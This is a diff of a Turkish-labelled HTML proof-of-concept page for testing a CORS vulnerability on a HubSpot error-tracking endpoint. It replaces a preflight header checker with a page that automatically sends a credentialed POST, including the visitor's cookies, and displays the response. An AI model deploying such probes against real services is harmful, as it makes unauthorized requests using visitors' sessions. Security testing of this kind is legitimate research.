@@ -1,145 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HubSpot CORS Test</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        #testBtn {
-            background: #2c3e50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        #testBtn:hover {
-            background: #1a252f;
-        }
-        #result {
-            margin-top: 20px;
-            padding: 15px;
-            background: white;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .success {
-            color: #27ae60;
-            font-weight: bold;
-        }
-        .error {
-            color: #e74c3c;
-            font-weight: bold;
-        }
-        .header-info {
-            background: #ecf0f1;
-            padding: 10px;
-            border-radius: 3px;
-            margin: 10px 0;
-            font-family: monospace;
-        }
-        pre {
-            white-space: pre-wrap;
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 3px;
-            overflow-x: auto;
-        }
-    </style>
+    <title>CORS Test - HubSpot</title>
 </head>
 <body>
-    <h1>HubSpot CORS Test PoC</h1>
-    <button id="testBtn">TESTİ ÇALIŞTIR</button>
-    <div id="result">
-        Sonuçlar burada görünecek...
-    </div>
+    <h1>HubSpot CORS Zafiyet Testi</h1>
+    <div id="response"></div>
 
     <script>
-        document.getElementById("testBtn").addEventListener("click", async function() {
-            const resultEl = document.getElementById("result");
-            resultEl.innerHTML = "<p>İstek gönderiliyor...</p>";
-            
-            try {
-                // 1. Önce OPTIONS (Preflight) isteği gönder
-                const optionsResponse = await fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7", {
-                    method: "OPTIONS",
-                    headers: {
-                        "Origin": "https://vukuff.github.io",
-                        "Access-Control-Request-Method": "POST",
-                        "Access-Control-Request-Headers": "content-type"
-                    }
-                });
-
-                // 2. Preflight yanıtını kontrol et
-                let resultHTML = "<h3 class='success'>✓ OPTIONS (Preflight) Yanıtı</h3>";
-                resultHTML += "<div class='header-info'>";
-                
-                const corsHeaders = [
-                    'Access-Control-Allow-Origin',
-                    'Access-Control-Allow-Credentials',
-                    'Access-Control-Allow-Methods',
-                    'Access-Control-Allow-Headers'
-                ];
-                
-                corsHeaders.forEach(header => {
-                    const value = optionsResponse.headers.get(header);
-                    resultHTML += `<p><strong>${header}:</strong> <code>${value || 'Yok'}</code></p>`;
-                });
-                resultHTML += "</div>";
-                
-                // 3. Asıl POST isteğini gönder
-                const postResponse = await fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "text/plain;charset=UTF-8",
-                        "Origin": "https://vukuff.github.io"
-                    },
-                    body: JSON.stringify({
-                        project: "js",
-                        logger: "javascript",
-                        message: "CORS test"
-                    })
-                });
-                
-                // 4. POST yanıtını işle
-                resultHTML += "<h3 class='success'>✓ POST Yanıtı</h3>";
-                resultHTML += `<p><strong>Status:</strong> ${postResponse.status} ${postResponse.statusText}</p>`;
-                resultHTML += "<div class='header-info'>";
-                
-                // POST yanıtındaki CORS başlıklarını kontrol et
-                corsHeaders.forEach(header => {
-                    const value = postResponse.headers.get(header);
-                    resultHTML += `<p><strong>${header}:</strong> <code>${value || 'Yok'}</code></p>`;
-                });
-                resultHTML += "</div>";
-                
-                // 5. Response body'i göster
-                const responseData = await postResponse.text();
-                resultHTML += `<h4>Yanıt Verisi:</h4><pre>${escapeHtml(responseData.substring(0, 1000))}</pre>`;
-                
-                resultEl.innerHTML = resultHTML;
-                
-            } catch (error) {
-                resultEl.innerHTML = `<p class='error'>⛔ Hata: ${error.message}</p>`;
-                console.error("Hata detayı:", error);
-            }
+        fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui", {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+                'Accept': 'application/json',
+            },
+            credentials: 'include'  // Çerezleri gönder (eğer API auth kullanıyorsa)
+        })
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById("response").innerText = "API Yanıtı: " + data;
+            console.log(data);
+        })
+        .catch(error => {
+            document.getElementById("response").innerText = "Hata: " + error;
         });
-        
-        function escapeHtml(text) {
-            return text
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
     </script>
 </body>
 </html>
